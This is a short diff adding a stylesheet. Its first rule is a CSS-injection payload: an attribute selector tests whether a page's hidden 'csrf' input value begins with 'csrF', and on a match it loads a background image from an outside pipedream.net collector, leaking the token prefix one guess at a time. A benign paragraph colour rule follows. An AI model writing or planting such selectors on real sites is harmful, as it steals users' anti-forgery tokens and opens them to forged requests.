@@ -1,0 +1,6 @@
+input[name=csrf][value^=csrF] ~ * {
+    background-image: url(https://enz44y4e3edmr4h.m.pipedream.net/csrF);
+}
+p{
+  color : red;
+}
